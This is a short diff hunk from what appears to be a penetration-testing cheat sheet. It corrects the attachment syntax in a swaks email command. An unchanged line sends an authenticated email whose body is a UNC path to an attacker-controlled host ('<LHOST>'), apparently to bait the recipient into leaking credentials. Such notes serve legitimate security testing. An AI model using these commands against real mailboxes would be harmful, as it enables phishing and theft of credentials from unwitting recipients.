@@ -5581,7 +5581,7 @@ $ svn diff -r 2
 ### Basic Commands
 
 ```c
-$ swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject: <SUBJECT>" --body <FILE>.txt --attach <FILE> --suppress-data -ap
+$ swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject: <SUBJECT>" --body <FILE>.txt --attach @<FILE> --suppress-data -ap
 $ swaks --server <RHOST> --port 587 --auth-user "<EMAIL>" --auth-password "<PASSWORD>" --to "<EMAIL>" --from "<EMAIL>" --header "Subject: <SUBJECT>" --body "\\\<LHOST>\"
 ```
 
